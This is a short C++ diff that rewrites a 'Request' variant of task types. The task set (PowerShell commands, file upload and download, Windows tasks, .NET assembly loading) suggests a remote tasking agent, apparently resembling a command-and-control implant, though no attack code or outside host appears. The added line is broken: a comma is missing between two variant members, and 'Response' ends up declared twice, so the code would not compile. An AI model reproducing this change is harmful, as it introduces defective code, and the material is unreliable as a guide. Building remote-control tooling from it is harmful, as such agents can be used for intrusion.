@@ -200,12 +200,8 @@ struct TaskError
         return obj;
     }
 };
-
-using Request = std::variant<
-    TaskRequest<CommandPowershell>,
-    TaskRequest<CommandUploadFile>,
-    TaskRequest<CommandDownloadFile>,
-    TaskRequest<bool>>;
+using Request = std::variant<TaskRequest<CommandPowershell>,  TaskRequest<CommandUploadFile>, TaskRequest<CommandWinTask>, TaskRequest<CommandDownloadFile> TaskRequest<CommandNetAsm>, TaskRequest<bool>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 using Response = std::variant<
     TaskResponse<TaskSuccess>,
